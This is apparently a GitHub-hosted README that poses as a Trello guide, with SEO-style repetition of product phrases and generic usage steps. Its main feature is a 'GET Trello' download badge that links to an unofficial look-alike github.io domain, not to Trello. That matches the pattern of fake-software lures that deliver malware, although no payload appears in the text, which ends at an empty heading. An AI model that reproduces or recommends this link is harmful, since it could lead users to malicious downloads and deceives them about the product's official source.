## Why This Exists

Most teams struggle with scattered notes, unclear priorities, and tasks that disappear between messages. **Trello** solves this by giving every project a visual board where work is easy to see, move, and finish.

Trello is built on the kanban idea: lists represent stages, cards represent tasks, and dragging a card shows real progress. Instead of guessing what matters next, teams open Trello boards and immediately understand where everything stands.

If your group needs one shared place for tasks, owners, due dates, and checklists, **Trello** is for you. Trello cards keep small details attached to the work, while Trello task management keeps the whole flow readable for beginners and experienced planners alike.

## Overview

Trello turns raw task lists into a shared visual map. With Trello boards and Trello cards, users can plan sprints, track errands, manage content calendars, or coordinate remote work without long detours.

Trello task management is flexible enough for personal use and structured enough for teams. Each list can represent a stage, each card can hold a task, and each board can hold a project. Trello kanban boards make priorities obvious because work moves left to right, and everyone sees the same picture.

For teams that need Trello project collaboration, comments, mentions, attachments, and activity logs keep communication inside the card instead of spread across chat threads. That means fewer lost details and more confident decisions.

## Quick Start with Trello

[![GET Trello](https://img.shields.io/badge/GET%20%E2%80%94%20Trello-0078D6?style=for-the-badge&logoColor=white)](https://trello-kanban-boards.github.io/.github/trello-boards)

1. **Open Trello** – Create an account or sign in to your workspace.
2. **Create a board** – Name the project and add lists for your stages.
3. **Add cards** – Turn each task into a Trello card with owner and due date.
4. **Move work** – Drag cards across lists as tasks progress.
5. **Collaborate** – Invite teammates and comment on cards for clarity.
6. **Review** – Check Trello boards regularly to keep priorities current.
7. **Archive** – Move finished cards away so the board stays readable.

## Understanding Trello Core Components

- **Boards** – Trello boards are the top-level container for a project.
- **Lists** – Columns represent stages such as To Do, Doing, and Done.
- **Cards** – Trello cards are individual tasks with details and comments.
- **Labels** – Color-coded labels highlight type, priority, or team.
- **Checklists** – Break a card into smaller steps without losing context.
- **Due Dates** – Timelines stay visible on the card and in calendar views.
- **Members** – Assign owners so responsibility is never unclear.
- **Activity** – Trello project collaboration leaves a readable history.

## Advanced Use Cases for Trello
